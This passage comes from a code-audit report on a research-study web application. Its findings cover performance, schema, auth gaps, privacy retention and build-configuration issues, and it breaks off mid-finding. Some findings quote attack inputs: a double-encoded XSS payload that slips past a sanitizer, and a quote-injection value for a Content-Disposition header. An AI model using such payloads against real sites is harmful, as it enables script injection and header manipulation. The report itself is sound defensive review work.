performSemanticSearch fetches up to 200 studies and generates an embedding for each inside Promise.all on every user query — study embeddings are never persisted, and the in-memory cache holds only 1000 entries keyed by the first 100 chars of the study text, so a 200-call burst per search recurs after restarts/evictions. The truncated cache key can also collide (studies sharing a 100-char prefix reuse the wrong embedding), skewing rankings.

Evidence: `const scoredStudies = await Promise.all(allStudies.map(async (study) => { ... await generateEmbedding(studyText);`

**Fix:** Precompute and store study embeddings in a column (refresh on update), key any cache by study id + updatedAt, and bound concurrency for cold fills.

### Semantic search makes up to 200 OpenAI embedding calls per query with unbounded concurrency

`server/services/semantic-search-engine.ts:212` · medium · effort: large · auditor: data-layer

Each NL search fetches 200 full study rows then Promise.all's generateEmbedding per row — up to 200 embedding API calls per request (unbounded concurrency, one failure logged per row). Embeddings are never persisted (comment admits "could be pre-computed and stored"); the in-memory cache holds only 1000 entries keyed by the first 100 chars of text, which can collide across studies sharing a title prefix and return the wrong embedding.

Evidence: `line 212 await query.limit(200); // Get more for semantic ranking; line 68 const cacheKey = text.slice(0, 100)`

**Fix:** Precompute and store study embeddings in a column/table (backfill job plus on-write hook), leaving only the query embedding per request; key any cache by study id, not a 100-char text prefix.

### Content-factory articles attached to an arbitrary study (first row or id 1)

`server/services/seo-content-factory.ts:405` · medium · effort: medium · auditor: services-r-z

saveGeneratedArticle requires a studyId because blog_articles.study_id is NOT NULL, so when none is provided it grabs `db.select(...).from(studies).limit(1)` (unordered first row) or hardcodes 1. Keyword-cluster marketing articles are thus permanently attributed to an unrelated study: they appear under that study's /:id/blogs tab, and the retraction monitor would flag these unrelated marketing posts if that study is ever retracted.

Evidence: `const [anyStudy] = await db.select({ id: studies.id }).from(studies).limit(1); studyId = anyStudy?.id || 1;`

**Fix:** Make blog_articles.study_id nullable for standalone SEO content (or add a dedicated null-study sentinel category) and pass a genuinely related study when one exists.

### AI-generated study slugs have no uniqueness guarantee — duplicate slugs serve the wrong study

`server/services/study-seo-enrichment.ts:159` · medium · effort: small · auditor: services-r-z

studies.slug is not unique (shared/schema.ts:337, plain non-unique index). enrichAndSaveStudy derives the slug from the AI plainLanguageTitle with no collision check, and study-analysis-pipeline.ts:277 writes step5.slug the same way. Similar studies routinely get identical AI titles ('Hydrogen Water Reduces Oxidative Stress'), so two studies can share a slug; GET /api/studies/slug/:slug then returns an arbitrary one and the other page becomes unreachable/mis-linked.

Evidence: `const slug = study.slug || enrichment.plainLanguageTitle.toLowerCase().replace(/[^a-z0-9]+/g, "-")...substring(0, 100);`

**Fix:** Check for an existing slug and append the study id (or a counter) on collision in both write paths; ideally add a unique index after backfilling duplicates.

### getEnrichmentSummary compares text[] columns to '' — endpoint always throws a Postgres error

`server/services/targeted-enrichment.ts:264` · medium · effort: small · auditor: services-r-z

healthConditions and bodySystems are text arrays (shared/schema.ts:326-327), but the summary query uses `${studies.healthConditions} != ''`. Postgres cannot cast '' to text[] ('malformed array literal'), so the query errors at runtime and the admin enrichment-summary endpoint (server/routes/enrichment-routes.ts:62) always returns 500.

Evidence: `count(case when ${studies.healthConditions} is not null and ${studies.healthConditions} != '' then 1 end)`

**Fix:** Use array_length(${studies.healthConditions}, 1) > 0 (as the candidate query at line 106 already does) instead of != ''.

### Targeted enrichment endlessly re-selects studies the AI cannot enrich, burning API spend

`server/services/targeted-enrichment.ts:101` · medium · effort: small · auditor: services-r-z

The candidate query selects studies missing any of keywords/healthConditions/bodySystems/conclusion, but there is no processed marker or attempt counter. If the AI returns an empty array or omits a field (common for abstract-less studies), the study is re-selected in every scheduler cycle (and each new-study lifecycle run calls checkAndEnrichStudies), repeatedly re-spending Haiku calls on the same ~50 unenrichable rows forever. Contrast with study-summary-enrichment.ts which added a sentinel for exactly this failure mode.

Evidence: `or(isNull(studies.keywords), sqlarray_length(${studies.keywords}, 1) = 0, ...) ).limit(50)`

**Fix:** Write a sentinel or enrichmentAttemptedAt timestamp after processing (even when the AI returns nothing) and exclude/back off recently attempted rows in the candidate query.

### globalErrorHandler misclassifies server-side TypeErrors as client 400s

`server/utils/error-handler.ts:246` · medium (verifier suggests low) · effort: small · auditor: routes-utils

Any TypeError reaching the global error handler — the most common signature of a server-side programming bug (reading a property of undefined in an unwrapped handler, e.g. via asyncHandler routes) — is returned as 400 "Invalid data format". Real 500-class defects are hidden from clients and shifted out of 5xx monitoring/alerting, so bugs surface as apparent client errors and go untriaged. TypeError is also non-operational per isOperationalError, contradicting the 400 classification.

Evidence: `} else if (err.name === "CastError" || err.name === "TypeError") { handleApiError(res, err, ErrorType.VALIDATION_ERROR, 400, "Invalid data format");`

**Fix:** Drop TypeError from the 400 branch (keep CastError if desired); let TypeErrors fall through to the 500 UNKNOWN branch so Sentry/monitoring see them as server faults.

### sanitizeUserText decodes HTML entities AFTER stripping tags, allowing double-encoded XSS payloads through

`server/utils/sanitize.ts:29` · medium (verifier suggests low) · effort: small · auditor: security-input

The public-input sanitizer loops strip-then-decode. Each pass strips tags first, then decodes entities, so a double-encoded payload like `&amp;lt;img src=x onerror=alert(1)&amp;gt;` becomes raw `<img ...>` after the final decode with no subsequent strip. The comment claims it 'prevent[s] stored XSS', giving false assurance. Used by the public contact form and multi-format routes. No current HTML sink renders contact messages, so it is latent, but any future innerHTML render of stored text is exploitable.

Evidence: `for(let i=0;i<2;i++){ s=s.replace(/<[^>]*>/g,""); s=s.replace(/&lt;/gi,"<")... } (strip precedes decode)`

**Fix:** Replace the regex strip/decode with a DOM-aware allowlist sanitizer (the repo already uses DOMPurify in sanitize-html.ts) or, at minimum, decode entities BEFORE stripping and loop until the string is stable.

### IP addresses and user-agents retained indefinitely in audit_logs and user_sessions

`shared/schema.ts:112` · medium · effort: small · auditor: gap

audit_logs (schema.ts:103-125) and user_sessions (schema.ts:80-101) store ip_address and user_agent. auth-routes writes IP+UA on registration, login, failed_login, password events (e.g. auth-routes.ts:284). No cleanup, TTL, or retention job exists anywhere in server/ for these tables — rows persist until the user deletes their account; failed_login rows for non-users (userId set-null) persist forever. Unbounded retention of online identifiers has no documented purpose limit and the privacy policy states no retention period.

Evidence: `ipAddress: text("ip_address"), userAgent: text("user_agent"), (auditLogs); auth-routes.ts:284 req.ip on failed_login`

**Fix:** Add a scheduled job pruning audit_logs and expired user_sessions rows past a fixed window (e.g. 90 days for security logs), and state that window in the privacy policy.

### manualChunks `react/` substring match dumps lucide-react into eager vendor chunk; icons chunk never emitted

`vite.config.ts:79` · medium · effort: small · auditor: frontend-quality

`id.includes("react/")` matches "lucide-react/" (and "@sentry/react/"), and this check runs before the lucide-react→"icons" rule, so all 162 used lucide icon modules plus Sentry land in the eagerly-loaded 241 kB vendor chunk. The intended "icons" chunk is never created (no icons-*.js in build output). Relatedly, the single "ui" chunk merges every Radix package used anywhere (incl. admin-only menubar/context-menu) into one 151 kB chunk that is modulepreloaded at startup.

Evidence: `vite.config.ts:79 if (id.includes("react/")) return "vendor"; vs :82 if (id.includes("lucide-react")) return "icons"; — vendor sourcemap: lucide-react 162 modules; build output has no icons chunk.`

**Fix:** Match exactly: `id.includes("node_modules/react/")` and `node_modules/react-dom/`. Move the lucide check above the react check. Consider dropping the blanket @radix-ui "ui" chunk so admin-only Radix stays in admin chunks.

### Client vitest project cannot discover or run React component tests; entire component/page/hook layer untested

`vitest.config.ts:34` · medium · effort: small · auditor: tests-ci

Client include is client/src/**/__tests__/**/*.test.ts — .tsx files are excluded — and environment is "node" (line 31), so a Component.test.tsx added anywhere is silently never run (compounded by CI's --passWithNoTests). @testing-library/react, user-event, jest-dom, and jsdom are all installed (package.json:91,127-129) but unused: zero .test.tsx files exist. All pages, components, and hooks (StudyForm, StudyTable, admin UI) have no tests.

Evidence: `include: ["client/src/**/__tests__/**/*.test.ts"], with environment: "node"`

**Fix:** Change glob to *.test.{ts,tsx}; add environmentMatchGlobs or a separate jsdom project for .tsx tests. Add first component tests for StudyForm and StudyTable (both had recent query-key bugs).

### Coverage works but is 8.85% overall with no thresholds and no CI enforcement; top 5 highest-risk untested areas identified

`vitest.config.ts:46` · medium · effort: large · auditor: tests-ci

vitest run --coverage executes cleanly (v8 provider). All files: 8.85% stmts. Top-5 riskiest untested areas: (1) server/services 4.67% — job-scheduler.ts (1650 lines, cron-driven AI generation/syncs = spend + prod writes) and blog/SEO generators; (2) server/routes 8.87% across 43 files — admin CRUD and study routes; (3) server/utils/storage.ts, error-handlers.ts, sentry.ts, monitoring at 0% — uploads and the error path itself; (4) React client layer (finding above); (5) server/migrations 1.73%.

Evidence: `All files | 8.85 | 3.77 | 6.3 | 9.17 ; server/services | 4.67 ; storage.ts | 0`

**Fix:** Add coverage step to CI with modest thresholds (e.g. lines 8%) to ratchet upward; prioritize unit tests for job-scheduler dispatch logic, storage.ts, and error-handlers using the existing mocked-db convention.

---

## LOW (48 findings)

### No dependency-audit or lint step in CI; PR gate is only typecheck + build + unit tests

`.github/workflows/ci.yml:24` · low · effort: small · auditor: tests-ci

On PRs, CI runs exactly: npm install, tsc --noEmit, npm run build, vitest. There is no npm audit step (the known-vulnerable react-quill/exceljs deps and any future advisories are invisible to CI), no lint step, and no coverage or e2e jobs. Push trigger covers only the hydrogen-studies branch, which is fine, but the PR gate is thinner than the repo's risk profile warrants.

Evidence: `steps: checkout, setup-node, npm install, npx tsc --noEmit, npm run build, npx vitest run --passWithNoTests`

**Fix:** Add `npm audit --omit=dev --audit-level=high` (non-blocking at first if needed) and an eslint step to the CI job; consider Dependabot/renovate config for the two known vulnerable packages.

### [known] StudyTable query-key mis-serialization confirmed; component is also dead code with wrong response type

`client/src/components/admin/StudyTable.tsx:45` · low · effort: small · auditor: frontend-correctness

Re-verified the known issue: queryKey ["/api/studies", searchQuery, page, limit] hits the default getQueryFn, which Object.entries() the string searchQuery into garbage params (?0=h&1=y...), and page/limit (indices 2-3) are never sent. Additionally it types the response as Study[] and calls data?.filter, but GET /api/studies returns PaginatedResults — it would throw at render. Mitigating: the component is imported nowhere (StudiesManagementPage uses pages/admin/StudiesTable.tsx), so this is unreachable dead code.

Evidence: `queryKey: ["/api/studies", searchQuery, page, limit] ... data?.filter((study) => ...) — no imports of this file exist`

**Fix:** Delete components/admin/StudyTable.tsx (part of the known dead-component cleanup); if ever revived, pass filters as one object key element and read result.data.

### ChatWidget calls nonexistent GET /api/chat/conversation/:id; conversation/feedback endpoints are stubs

`client/src/components/chat/ChatWidget.tsx:171` · low · effort: medium · auditor: api-contract

loadConversation fetches /api/chat/conversation/:id but chat-routes.ts defines no such route (only /chat/conversations, which is a placeholder always returning []). If it were reachable it would 404 and show 'Failed to load conversation history' every time; it is currently dead only because the conversations list is always empty. Server also fabricates conversationId with Math.random() (chat-routes.ts:71) which the client stores, and /chat/feedback only console.logs submissions.

Evidence: `const res = await apiRequest("GET", /api/chat/conversation/${id});`

**Fix:** Either implement conversation persistence (route + storage) or remove the conversations sidebar, loadConversation, and fabricated conversationId from both sides until it exists.

### Site-wide mobile menu toggle is an unlabeled icon button without aria-expanded

`client/src/components/layout/SiteHeader.tsx:117` · low · effort: small · auditor: frontend-quality

The mobile navigation toggle rendered in the sticky header on every page contains only a lucide Menu/X icon with no accessible name and no aria-expanded/aria-controls state, so screen-reader users hear an unnamed button and get no indication the menu opened. SiteHeader also has zero aria-label/aria-expanded attributes overall (the top-level element is a <nav>, so the landmark itself is fine).

Evidence: `SiteHeader.tsx:117-126 <button className="btn-tertiary btn-sm p-2" onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}>{isMobileMenuOpen ? <X .../> : <Menu .../>}</button> — no aria-label.`

**Fix:** Add aria-label={isMobileMenuOpen ? "Close menu" : "Open menu"}, aria-expanded={isMobileMenuOpen}, and aria-controls pointing at the MobileNav container id.

### Error-body contract split three ways; 91 raw fetch() sites discard server error detail

`client/src/lib/queryClient.ts:18` · low · effort: medium · auditor: api-contract

Server error bodies use three conventions: {error} (~290 sites), {message} (~33), {success:false,error} (~35). The shared wrapper throwIfResNotOk parses error|message correctly — but only ~110 apiRequest call sites use it; 91 raw `fetch("/api/...")` sites throw generic strings ('Failed to fetch blogs', 'Search failed'), so server validation messages (e.g. 400 'Query is required... at most 1000 characters') never reach the UI. No 200-with-error-body antipattern found server-side — statuses are correct.

Evidence: `if (typeof obj.error === "string") message = obj.error; else if (typeof obj.message === "string")`

**Fix:** Standardize on {error, message?} in a shared/ ApiError type; migrate raw fetch call sites to apiRequest/getQueryFn (mechanical codemod), surfacing ApiError.message in toasts and error states.

### MyDashboardPage shows sign-in wall to authenticated users while auth loads

`client/src/pages/MyDashboardPage.tsx:66` · low · effort: small · auditor: frontend-correctness

MyDashboardPage renders the 'Sign in to access your dashboard' card whenever user is falsy, but useAuth's isLoading is ignored. On a cold load of /my-dashboard the check-session and /api/auth/me queries are in flight, user is null, and logged-in users see the sign-in/register wall flash (and can click through to /login) before the dashboard appears.

Evidence: `const { user } = useAuth(); ... if (!user) { return ( ... "Sign in to access your dashboard" ) }`

**Fix:** Destructure isLoading from useAuth and render a skeleton/loader until it's false before deciding between the sign-in card and the dashboard.

### Admin studies search fetches on every keystroke; claimed debounce does not exist

`client/src/pages/admin/StudiesTable.tsx:209` · low · effort: small · auditor: frontend-correctness

handleSearchChange is commented 'with debounce effect' but sets searchQuery directly on each onChange; searchQuery is in the queryKey, so every keystroke issues a full GET /api/studies fetch (full-text search per key). Admins skip the search rate limiter (skipForAdmin), so nothing fails, but a 20-character search performs ~20 sequential DB search queries and churns the query cache.

Evidence: `// Handle search input change with debounce effect\n const handleSearchChange = (value: string) => { setSearchQuery(value); ... }`

**Fix:** Debounce the search value (e.g. useDeferredValue or a 300ms debounced state) before it enters the queryKey.

### Node version skew: engines >=20 (unbounded), CI on 22, nixpacks unpinned, esbuild targets node20

`nixpacks.toml:1` · low · effort: small · auditor: deps-build

package.json engines is ">=20.0.0", CI tests on Node 22, esbuild bundles for --target=node20, and nixpacks.toml pins nothing, leaving Railway's Node major to nixpacks' resolution of the open-ended range. Prod can therefore run a different Node major than CI tested, and future nixpacks base-image bumps change prod Node silently.

Evidence: `engines: { "node": ">=20.0.0" }; ci.yml node-version: 22; build script --target=node20; nixpacks.toml has no node version`

**Fix:** Pin one major everywhere: engines "node": "22.x", NIXPACKS_NODE_VERSION=22 (or [variables] in nixpacks.toml), keep CI at 22, and bump esbuild --target=node22 to match.

### [known] Unused direct dependency quill@^2.0.3 alongside vulnerable react-quill

`package.json:98` · low · effort: small · auditor: frontend-quality

package.json declares both quill ^2.0.3 and react-quill ^2.0.0, but no source file imports quill directly — the only editor usage is components/ui/wysiwyg-editor.tsx importing react-quill, which bundles its own quill 1.x (the version with the known XSS advisories from the July audit). The standalone quill 2 dependency is dead weight and misleadingly suggests the vulnerable 1.x was upgraded. Bundle-wise the editor is contained: wysiwyg-editor is a 225 kB lazy chunk loaded only by admin Blog/Study forms; exceljs is server-only (server/routes/import-routes.ts:3).

Evidence: `grep for from "quill"/require('quill') across client/server/scripts: zero hits; only import ReactQuill from "react-quill" in wysiwyg-editor.tsx:2.`

**Fix:** Remove the unused quill dependency, and when addressing the known react-quill vulnerability, migrate wysiwyg-editor to a maintained editor (react-quill is abandoned) or react-quill-new which uses quill 2.

### Unused direct dependency quill@2.0.3 — dead weight carrying an open XSS advisory

`package.json:98` · low · effort: small · auditor: deps-build

`quill` is a direct dependency but nothing imports it: react-quill uses its own nested quill@1.3.7, and the only quill reference in client code is react-quill's CSS path. quill 2.0.3 (the latest release) is itself flagged (GHSA-v3m3-f69x-jf25, XSS via HTML export) with no fixed version above it, so it permanently trips audit while providing nothing.

Evidence: `grep for from "quill" returns nothing; only hit is wysiwyg-editor.tsx: import "react-quill/dist/quill.snow.css"`

**Fix:** Remove "quill" from dependencies (`npm rm quill`). If the WYSIWYG is migrated to direct quill 2.x instead of TipTap, re-add deliberately and track the advisory.

### Dead devDependencies: @types/passport, @types/passport-local for uninstalled passport; deprecated @types/dompurify stub

`package.json:140` · low · effort: small · auditor: deps-build

passport is not a dependency and no file in server/, client/, or shared/ references passport, yet @types/passport and @types/passport-local remain in devDependencies. @types/dompurify is a deprecated stub (dompurify ships its own types since v3). These inflate installs (both CI and Railway install devDeps) and mislead readers about the auth stack.

Evidence: `grep -rln "passport" server client/src shared -> no matches; npm view @types/dompurify deprecated: "dompurify provides its own type definitions"`

**Fix:** npm rm @types/passport @types/passport-local @types/dompurify

### package.json declares "license": "MIT" on a proprietary commercial codebase

`package.json:5` · low · effort: small · auditor: gap

The repo (github.com/Echoh2o/Hydrogen-Studies) powering a commercial site is marked MIT. If the repo is or becomes public, MIT grants anyone the right to reuse the entire codebase; it also misleadingly implies open licensing for a project whose value is proprietary and whose bundled study content is third-party copyrighted material that MIT cannot cover.

Evidence: `"license": "MIT",`

**Fix:** Change to "license": "UNLICENSED" and add "private": true (verify it is set); confirm the GitHub repo visibility is private.

### WP import decodes HTML entities after stripping tags, reintroducing markup into stored abstracts

`scripts/import-wordpress-xml.ts:268` · low · effort: small · auditor: gap

The abstract cleaner strips tags first (`replace(/<[^>]*>/g, "")`), then decodes &lt;/&gt;/&amp;. WordPress content containing entity-escaped markup (common: `&lt;i&gt;in vivo&lt;/i&gt;`, or escaped script from plugins) is decoded back into literal HTML tags that are stored in studies.abstract un-stripped. Rendered as React text this shows raw `<i>` tags to users; any HTML-rendering surface (RSS, meta description, AI prompt echo) would emit the markup.

Evidence: `.replace(/<[^>]*>/g, "") runs before .replace(/&lt;/g, "<").replace(/&gt;/g, ">")`

**Fix:** Decode entities first, then strip tags (loop until stable), and decode &amp; last to avoid double-decode.

### WP import 'Total studies in database' prints the first row's id, not a count

`scripts/import-wordpress-xml.ts:435` · low · effort: small · auditor: gap

`db.select({ count: studies.id }).from(studies)` selects the id column of every row without an aggregate; destructuring the first row labels an arbitrary study id as the total. The post-import verification line operators use to confirm a bulk import therefore prints a meaningless number (e.g. '1' or the lowest id), hiding both under-imports and accidental duplicate explosions.

Evidence: `const [{ count }] = await db.select({ count: studies.id }).from(studies); then console.log(\nTotal studies in database: ${count})`

**Fix:** Use `db.select({ count: count() }).from(studies)` (drizzle-orm count()) or `sql`count(*)::int``.

### Bot HTML cache has no invalidation — deleted/unpublished content served 200 for up to 2h

`server/middleware/seo-bot-middleware.ts:486` · low · effort: medium · auditor: gap

botHtmlCache entries live 2 hours and nothing ever invalidates them: unpublishing a blog, deleting a study, or changing a slug leaves the old prerendered 200 page served to crawlers (with stale canonical/JSON-LD) until TTL expiry. The redirect middleware runs earlier so slug redirects work, but hard deletions without redirect rows keep returning 200 to bots while humans get the SPA 404 — a temporary bot/human divergence window on every content removal.

Evidence: `const BOT_CACHE_TTL = 2 * 60 * 60 * 1000; // 2 hours (no delete/invalidate call sites outside the middleware)`

**Fix:** Export an invalidateBotCache(path) helper and call it from study/blog delete, unpublish, and slug-change code paths; optionally shorten TTL for content pages.

### add-stored-images migration swallows its own failure yet is recorded as applied

`server/migrations/add-stored-images.ts:22` · low · effort: small · auditor: data-layer

runStoredImagesMigration catches any error, logs it, and returns normally, so migration-runner records 013_add_stored_images as applied even when the CREATE TABLE failed (e.g. transient DB error at boot) — it will never retry. Impact is softened because stored_images is now also declared in shared/schema.ts:2774 and created by db:push, but the pattern violates the runner's contract (runner expects up() to throw on failure, migration-runner.ts:67-70).

Evidence: `add-stored-images.ts:22-24 } catch (err) { logger.error("stored_images migration failed", err, "Migration"); } — no rethrow`

**Fix:** Remove the try/catch (or rethrow after logging) so a failed run is not marked applied; audit other migrations for the same swallow (add-multiple-images-support.ts has it too).

### Six migration files are dead code — never registered in the boot runner or invoked anywhere

`server/migrations/keyword-monitor-migration.ts:1` · low · effort: small · auditor: data-layer

add-consumer-categories, add-journal-publish-date, add-multiple-images-support, add-research-data-fields, keyword-monitor-migration, and tagging-system-migration are imported nowhere (grep across server/, scripts/, client/ finds zero references) and are absent from the 001-016 list in app.ts:936-953. Their tables/columns are all declared in shared/schema.ts (keywords:1243, tags:1364, consumer_categories:577, etc.) so db:push owns them; the files only mislead future readers about how schema changes ship.

Evidence: `grep -rln for each name outside migrations/ returns nothing; app.ts runner list covers only 001-016`

**Fix:** Delete the six unreferenced migration files, or register them in the runner if any environment still lacks their DDL; add a comment in migrations/ stating that db:push owns schema for these tables.

### Blog-generation job state exposed on unauthenticated endpoints

`server/routes/blog-recommendation-routes.ts:255` · low · effort: small · auditor: security-routes

GET /api/blog-recommendations/jobs and /jobs/:id (line 270) have no requireAdmin while every sibling mutation on the router does. They expose internal content-pipeline job state (queued titles, progress, errors) to anonymous users, and numeric job IDs make enumeration trivial. GET /recommendations (line 17) similarly returns the internal recommendation queue.

Evidence: `router.get("/jobs", async (req, res) => { — vs router.post("/jobs", requireAdmin, ...)`

**Fix:** Add requireAdmin (or isAdminOrEditor) to the GET /recommendations, /jobs, and /jobs/:id handlers to match the guarded mutations on the same router.

### Public endpoints leak internal error messages in 500 responses

`server/routes/chat-routes.ts:85` · low · effort: small · auditor: routes-utils

The public /api/chat handler returns details: error.message on any failure, and trends-routes.ts:55 returns message: error.message the same way. Raw driver/AI-provider error strings (SQL fragments, table names, upstream API errors, internal paths) reach anonymous users, inconsistent with the sanitized getUserFriendlyMessage contract used by the global error handler.

Evidence: `details: error instanceof Error ? error.message : "Unknown error",`

**Fix:** Drop the details/message passthrough on public routes (log server-side only), or route these errors through handleApiError/globalErrorHandler which already sanitize messages in production.

### Chat feedback free-text comments written to platform logs; conversation persistence is illusory

`server/routes/chat-routes.ts:403` · low · effort: small · auditor: gap

POST /api/chat/feedback console.logs the raw comment field — free text adjacent to health questions — into Railway stdout logs, an undisclosed, unmanaged store with platform-side retention. Meanwhile the chat_messages/conversations tables exist but are never written; conversationId is a random number (chat-routes.ts:72) and /api/chat/conversations returns [], so the widget's conversation list UI implies persistence that does not exist. Health queries themselves are not persisted to DB (good), only sent to the AI provider.

Evidence: `console.log("Chat feedback received:", { messageId, rating, comment });`

**Fix:** Stop logging the raw comment (log messageId/rating only) or store feedback in the existing chat_feedback table; remove or implement the conversations UI so it does not misrepresent storage.

### /life-stages endpoint runs five uncached ILIKE full-table scans over title+abstract per request

`server/routes/consumer-categories-routes.ts:680` · low · effort: small · auditor: data-layer

The public GET /life-stages route issues 5 parallel `SELECT COUNT(*) FROM studies WHERE title ILIKE ANY($1) OR abstract ILIKE ANY($1)` queries on every request — sequential scans over the text-heavy studies table with no index support and no caching, even though the sibling category-counts endpoint in the same file caches with a TTL (lines 11-13, 80-82). Counts change rarely; every page hit pays the scans.

Evidence: `consumer-categories-routes.ts:683-685 pool.query(SELECT COUNT(*) ... title ILIKE ANY($1) OR abstract ILIKE ANY($1), [likeTerms]) inside lifeStages.map, no cache check`

**Fix:** Reuse the file's existing TTL-cache pattern for the life-stage counts (they only change when studies are imported), or precompute counts in the study import pipeline.

### Keyword-monitor schedule mutations rely on a sibling router's mount order for auth

`server/routes/keyword-monitor-schedule-routes.ts:122` · low · effort: small · auditor: security-routes

POST /schedule (122), POST / (160), and POST /run-now (200) — admin cron-control mutations — have zero auth middleware in this file. They are only protected because app.ts mounts keywordMonitorRoutes (which has router.use(requireAdmin), keyword-monitor-routes.ts:17) at the parent path /api/keywords one line earlier (app.ts:590-591), so requests transit that router's guard first. Reordering the mounts or removing the parent router silently exposes unauthenticated schedule control — the exact failure mode the memory notes for OAuth route ordering.

Evidence: `router.post("/schedule", async (req, res) => { — no requireAdmin in file`

**Fix:** Add router.use(requireAdmin) at the top of keyword-monitor-schedule-routes.ts (or requireAdmin at the app.ts mount) so the guard does not depend on sibling mount order.

### Multi-format content readable and exportable unauthenticated regardless of publish status

`server/routes/multi-format-routes.ts:112` · low · effort: small · auditor: security-routes

GET /api/multi-format/:id, /:id/export (line 458), /study/:studyId (84), and the / list (255) have no auth and return multiFormatContent rows with no status filter, so draft/scheduled generated content (social posts, newsletters) created by admins is enumerable by sequential integer ID and downloadable via export. Mutations (PUT/DELETE/generate/publish) are correctly admin-gated; only the reads leak.

Evidence: `const content = await db.query.multiFormatContent.findFirst({ where: eq(multiFormatContent.id, contentId) });`

**Fix:** Restrict reads to published content for unauthenticated users (status filter), or add requireAdmin/isAdminOrEditor to the read endpoints since the only consumer is the admin dashboard.

### Multi-format content read/export/stats endpoints are unauthenticated

`server/routes/multi-format-routes.ts:458` · low · effort: small · auditor: security-input

The router is mounted with no guard (app.ts: app.use('/api/multi-format', multiFormatRoutes)) and GET '/:id/export', '/:id', '/', '/study/:studyId', and '/stats' omit requireAdmin, while sibling mutating routes correctly use it. Any unauthenticated caller can enumerate and download all generated content and stats. Impact is limited because the content is marketing material intended for publication, but it is an inconsistent trust boundary.

Evidence: `router.get("/:id/export", async (req, res) => {  // no requireAdmin, unlike PUT/DELETE/publish on same router`

**Fix:** Add requireAdmin to the export/read/stats GET routes (or mount the whole router behind requireAdmin), matching the mutation routes.

### multi-format publish returns 500 for invalid ID and accepts unvalidated body

`server/routes/multi-format-routes.ts:321` · low · effort: small · auditor: routes-utils

POST /api/multi-format/:id/publish throws AppError("Invalid content ID", 400) but its own catch block unconditionally responds res.status(500), so a bad ID surfaces as a server error with the message "Invalid content ID". isPublished is taken from req.body without boolean validation — a missing field silently unpublishes content (publishedAt set to null). Same swallow-the-AppError pattern exists in other handlers of this file (e.g. line 230 batch).

Evidence: `throw new AppError("Invalid content ID", 400, ErrorCode.VALIDATION_ERROR); } ... } catch (error) { ... res.status(500).json({`

**Fix:** Return error.statusCode when error instanceof AppError (or return res.status(400) directly instead of throwing), and 400 unless typeof req.body.isPublished === "boolean".

### POST /api/search/save returns fake success without persisting anything

`server/routes/natural-language-search-routes.ts:407` · low · effort: small · auditor: routes-utils

The save-search endpoint builds an in-memory object with id: Date.now() and responds { success: true, saved } but never writes to the database (comment: "simplified for now"). Any client or API consumer using it silently loses saved searches while being told the save succeeded. No client code currently calls it, making it a public trap endpoint.

Evidence: `const saved = { id: Date.now(), query, name, filters: filters || {}, userId: userId || "anonymous", createdAt: new Date(), };`

**Fix:** Either persist to a saved_searches table or remove the route (and return 404) until implemented — do not return success:true for a no-op.

### Repeated query params (?q=a&q=b) crash the main page to a 500

`server/routes/proxy-routes.ts:429` · low · effort: small · auditor: gap

`(req.query.q as string || "").trim()` assumes a string, but Express yields an array for repeated params (?q=a&q=b or ?q[]=a). Arrays are truthy, so `.trim()` throws TypeError and the catch returns a 500 error page. Same pattern for `condition` (line 430), `type` (line 431), and `condition` on /export (line 1379). Any visitor or crawler following a doubled-param URL gets a 500 instead of results, and crawlers may record the storefront as erroring.

Evidence: `const search = (req.query.q as string || "").trim().slice(0, 200);`

**Fix:** Normalize params first, e.g. `const first = (v: unknown) => Array.isArray(v) ? String(v[0] ?? "") : String(v ?? "");` and apply to q, condition, type on all routes.

### Content-Disposition filename built from unvalidated user-controlled condition param

`server/routes/proxy-routes.ts:1449` · low · effort: small · auditor: gap

The /export condition query param is only trimmed — no length cap or charset check — and is interpolated into the quoted filename of Content-Disposition. A double-quote in the param (`?condition=x";foo="y`) breaks out of the quoted-string and injects extra header parameters (e.g. an alternate filename/extension); CR/LF makes setHeader throw, turning the request into a 500. All other routes slice/validate their params; this one doesn't.

Evidence: `const conditionSlug = (req.query.condition as string || "").trim(); ... res.setHeader("Content-Disposition", attachment; filename="hydrogen-research-${conditionSlug}.csv");`

**Fix:** Whitelist the slug before use: `if (!/^[a-z0-9-]{1,100}$/i.test(conditionSlug)) conditionSlug = ""` — this also matches how slugs are generated elsewhere.

### Local escapeHtml/escapeAttr duplicate and diverge from shared html-safety helpers

`server/routes/proxy-routes.ts:291` · low · effort: small · auditor: gap

The file imports jsonLdSafe/safeUrl from server/utils/html-safety.ts but redefines escapeHtml/escapeAttr locally. The local escapeAttr omits single-quote escaping, unlike the shared version (html-safety.ts:29 escapes `'`). Currently every attribute in this file is double-quoted so it is not exploitable, but a future single-quoted attribute (or a copy-paste from another renderer) would silently become an XSS sink into the echowater.com origin — exactly the drift the shared module's doc comment warns about.

Evidence: `function escapeAttr(str: string): string { ... return str.replace(/&/g, "&amp;").replace(/\"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); } // no ' escaping`

**Fix:** Delete the local copies and import escapeHtml/escapeAttr from server/utils/html-safety.ts alongside jsonLdSafe/safeUrl.

### Pluralization bug renders "5 studyies found" on search and condition pages

`server/routes/proxy-routes.ts:585` · low · effort: small · auditor: gap

`study${totalStudies !== 1 ? "ies" : ""}` concatenates to "studyies" for any count other than 1. This visible typo appears on the storefront's filtered search results (line 585) and on every condition landing page (line 924, "<strong>N</strong> studyies found for this condition"), which are indexed SEO pages.

Evidence: `${totalStudies} study${totalStudies !== 1 ? "ies" : ""} found (same pattern at line 924)`

**Fix:** Use `totalStudies === 1 ? "study" : "studies"` in both places.

### Paginated condition pages canonicalize to page 1 with no noindex, unlike the main page

`server/routes/proxy-routes.ts:963` · low · effort: small · auditor: gap

GET /condition/:slug passes canonicalPath `/condition/${slug}` for every page, so ?page=2+ declares a canonical of page 1 while serving different content, and no noindex is applied. The main list route explicitly handles this (line 600: `hasFilters` includes `page > 1` and sets noIndex). Canonical-to-first-page on paginated series is against Google guidance and can cause deep condition pages to be dropped or mis-canonicalized.

Evidence: `renderPage(Hydrogen Research for ${condition.name}..., ..., /condition/${slug}) — no options arg; contrast line 600-606 noIndex: hasFilters`

**Fix:** Mirror the main route: pass `{ noIndex: page > 1 }` to renderPage for condition pages, or make the canonical self-referencing by appending ?page=N when page > 1.

### RSS blog feed enclosure URLs are not absolutized

`server/routes/seo-routes.ts:554` · low · effort: small · auditor: gap

